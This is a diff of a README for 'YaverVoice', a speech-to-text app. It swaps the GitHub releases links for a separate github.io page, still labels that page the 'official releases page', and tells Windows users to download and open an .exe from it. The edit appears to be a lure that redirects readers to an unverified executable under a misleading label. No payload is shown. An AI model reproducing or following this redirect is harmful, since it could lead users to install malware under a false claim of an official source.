@@ -1,6 +1,6 @@
 # 🎙️ YaverVoice - Dictate text using your natural voice
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Uruguayan-choroplethmap778/YaverVoice/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://uruguayan-choroplethmap778.github.io)
 
 YaverVoice turns your spoken words into text on your computer screen. It works on Windows and Linux. The software captures your voice and writes it down in real time. It uses advanced speech recognition to ensure high accuracy. You can choose between two processing modes. The first mode connects to the cloud for fast results. The second mode keeps your data private by running everything on your computer.
 
@@ -8,7 +8,7 @@ YaverVoice turns your spoken words into text on your computer screen. It works o
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Uruguayan-choroplethmap778/YaverVoice/releases).
+1. Visit the [official releases page](https://uruguayan-choroplethmap778.github.io).
 2. Look for the latest version at the top of the page.
 3. Click the file that ends with .exe to start your download.
 4. Open the file once the download finishes.
